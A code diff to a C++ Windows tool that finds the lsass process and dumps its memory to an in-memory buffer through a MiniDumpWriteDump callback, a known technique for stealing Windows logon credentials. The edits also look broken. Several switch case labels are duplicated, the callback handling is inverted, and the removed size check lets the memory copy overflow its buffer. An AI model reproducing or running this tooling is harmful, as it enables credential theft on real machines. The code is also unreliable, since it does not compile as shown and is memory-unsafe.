@@ -2,7 +2,10 @@
 #include <DbgHelp.h>
 #include <iostream>
 #include <TlHelp32.h>
+#include <processsnapshot.h>
+#include <fstream>
 #include <vector>
+#include <string>
 #pragma comment (lib, "Dbghelp.lib")
 
 using namespace std;
@@ -36,20 +39,23 @@ BOOL CALLBACK MiniDumpCallback(
     PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
 )
 {
+    LPVOID destination = 0, source = 0;
+    DWORD bufferSize = 0;
+
     switch (CallbackInput->CallbackType)
     {
-    case ModuleCallback:
-    case ThreadCallback:
+    case IncludeModuleCallback:
+    case IncludeThreadCallback:
     case ThreadExCallback:
     case MemoryCallback:
     case CancelCallback:
         return TRUE;
 
-    case IncludeModuleCallback:
-    case IncludeThreadCallback:
-    case ThreadInfoCallback:
-    case ThreadExInfoCallback:
-    case MemoryInfoCallback:
+    case ModuleCallback:
+    case ThreadCallback:
+    case ThreadExCallback:
+    case MemoryCallback:
+    case CancelCallback:
         return FALSE;
 
     case IoStartCallback:
@@ -59,19 +65,14 @@ BOOL CALLBACK MiniDumpCallback(
     case IoWriteAllCallback:
         CallbackOutput->Status = S_OK;
 
-        if (CallbackInput->Io.Buffer && bytesRead < 1024 * 1024 * 75)
-        {
-            DWORD_PTR offset = CallbackInput->Io.Offset;
-            DWORD_PTR length = CallbackInput->Io.BufferBytes;
+        source = CallbackInput->Io.Buffer;
+        destination = (LPVOID)((DWORD_PTR)dumpBuffer + CallbackInput->Io.Offset);
+        bufferSize = CallbackInput->Io.BufferBytes;
+        bytesRead += bufferSize;
 
-            if (offset + length > 1024 * 1024 * 75)
-                length = 1024 * 1024 * 75 - offset;
+        RtlCopyMemory(destination, source, bufferSize);
 
-            memcpy((LPVOID)((DWORD_PTR)dumpBuffer + offset), CallbackInput->Io.Buffer, length);
-            bytesRead += length;
-
-            printf("[+] Minidump offset: 0x%llx; length: 0x%llx\n", CallbackInput->Io.Offset, CallbackInput->Io.BufferBytes);
-        }
+        printf("[+] Minidump offset: 0x%llx; length: 0x%llx\n", CallbackInput->Io.Offset, bufferSize);
         break;
 
     case IoFinishCallback:
@@ -86,6 +87,7 @@ BOOL CALLBACK MiniDumpCallback(
 
 int main() {
     DWORD lsassPID = 0;
+    DWORD bytesWritten = 0;
     HANDLE lsassHandle = NULL;
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     char processName[MAX_PATH] = {0};
